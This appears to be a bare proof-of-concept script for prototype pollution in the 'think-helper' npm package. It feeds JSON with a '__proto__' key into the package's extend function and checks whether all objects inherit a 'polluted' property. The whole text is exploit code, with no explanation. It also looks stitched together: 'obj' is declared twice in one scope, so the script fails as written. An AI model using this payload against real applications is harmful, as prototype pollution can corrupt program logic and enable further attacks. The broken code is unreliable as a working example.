var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('think-helper');
let obj = {};
console.log({}.polluted);
a.extend(obj, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);